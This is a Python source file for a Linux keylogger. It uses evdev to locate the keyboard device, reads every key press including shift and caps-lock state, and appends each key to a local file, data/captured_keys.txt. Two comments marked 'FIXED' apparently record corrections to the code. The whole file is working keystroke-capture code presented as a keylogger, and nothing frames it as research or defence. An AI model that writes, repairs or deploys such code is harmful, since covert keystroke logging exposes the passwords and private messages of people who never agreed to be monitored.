import evdev
from evdev import ecodes
import os

class Keylogger:
    def __init__(self, log_path="./data/captured_keys.txt"):  # FIXED: __init__
        self.log_path = log_path
        self.modifiers = {
            'shift': False,
            'capslock': False
        }
        os.makedirs(os.path.dirname(self.log_path), exist_ok=True)
    
    def find_keyboard(self):
        devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
        for device in devices:
            capabilities = device.capabilities()
            if ecodes.EV_KEY in capabilities:
                supported_keys = capabilities[ecodes.EV_KEY]
                if all(k in supported_keys for k in [ecodes.KEY_A, ecodes.KEY_F1, ecodes.KEY_F10]):
                    return device
        return None

    def update_modifiers(self, code, value):
        if code in [ecodes.KEY_LEFTSHIFT, ecodes.KEY_RIGHTSHIFT]:
            self.modifiers['shift'] = (value == 1)
        elif code == ecodes.KEY_CAPSLOCK and value == 1:
            self.modifiers['capslock'] = not self.modifiers['capslock']

    def run(self):
        device = self.find_keyboard()
        if not device:
            print("[!] Could not find a valid keyboard device.")
            return
        
        print(f"[*] Keylogger hooked: {device.name} ({device.path})")
        
        for event in device.read_loop():
            if event.type == ecodes.EV_KEY:
                self.update_modifiers(event.code, event.value)
                
                if event.value == 1:
                    key_name = evdev.ecodes.KEY[event.code].replace("KEY_", "")
                    
                    if "SHIFT" in key_name or "CAPSLOCK" in key_name:
                        continue
                    
                    output = ""
                    if self.modifiers['shift']:
                        output += "[SHIFT] "
                    if self.modifiers['capslock']:
                        output += "[CAPS] "
                    output += f"{key_name} "
                    
                    with open(self.log_path, "a") as f:
                        f.write(output + "\n")

if __name__ == "__main__":  # FIXED: __name__
    logger = Keylogger()
    try:
        logger.run()
    except KeyboardInterrupt:
        print("\n[*] Keylogger stopped.")
